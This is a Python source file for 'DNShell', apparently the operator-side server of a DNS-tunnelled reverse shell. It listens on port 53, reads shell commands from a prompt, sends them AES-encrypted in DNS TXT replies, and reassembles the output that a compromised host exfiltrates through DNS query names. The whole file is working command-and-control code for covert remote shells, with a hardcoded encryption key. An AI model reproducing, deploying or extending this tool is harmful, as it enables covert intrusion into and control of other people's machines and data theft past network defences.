#!/usr/bin/env python
# DNShell Server v1.3

from Crypto.Cipher import AES
import socket
import dnslib
import base64

PORT = 53
NXT_CMD = base64.b64encode("nxt")
PROMPT = 'SHELL >> '

# REPLACE THIS WITH YOUR OWN KEY #
secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# the character used for padding-
PADDING = '{'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# create a cipher object using the random secret
cipher = AES.new(secret)

def encrypt(string):
  encoded = EncodeAES(cipher, string)
  return encoded

def decrypt(string):
  decoded = DecodeAES(cipher, string)
  return decoded

def spawnShell(answer, payload):
  # Spawns our Command Shell:
  out = base64.b64encode(encrypt(raw_input(PROMPT)))
  answer.add_answer(
    *dnslib.RR.fromZone('{}.com 60 TXT "{}"'.format(payload, out)))
  return answer

def dashDecode(b64Cmd):
  # Converts encoded '-' padding to '=':
  if b64Cmd[3] == '-':
    b64Cmd = b64Cmd[0] + b64Cmd[2] + b64Cmd[4:] + '=='
  elif b64Cmd[1] == '-':
    b64Cmd = b64Cmd[0] + b64Cmd[2:] + '='
  return b64Cmd

def recievePayload(udps):
  data, addr = udps.recvfrom(1024)
  dnsD = dnslib.DNSRecord.parse(data)
  payload = dnsD.questions[0].qname.label[0]
  answer = dnsD.reply()
  return addr, payload, answer

def printResult(cmd_list):
  try:
    b64Cmd = ''.join(cmd_list)
    b64Cmd = dashDecode(b64Cmd)
    print '{}'.format(decrypt(base64.b64decode(b64Cmd)))
  except:
    # Base64 Decode Failed.
    print '[ERROR]: Couldn\'t Read Result from Host!'

def main():
  cmd_list = []  # Stores List of B64 Commands to be Executed
  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('', PORT))

  print 'RevShell DNS Server v1.0'
  print 'Waiting for Request .... \n'

  try:
    # Setup Initial Command Shell:
    addr, payload, answer = recievePayload(udps)
    answer = spawnShell(answer, payload)
    udps.sendto(answer.pack(), addr)

    # Main Event Loop:
    while 1:
      addr, payload, answer = recievePayload(udps)
      if (payload == NXT_CMD):
        printResult(cmd_list)
        cmd_list = []
        answer = spawnShell(answer, payload)
      else:
        cmd_list.append(payload)

      # Send back Response:
      udps.sendto(answer.pack(), addr)

  except (KeyboardInterrupt, EOFError) as e:
    print '\n-[ Connection Ended ]-\n'
    udps.close()


if __name__ == '__main__':
  main()
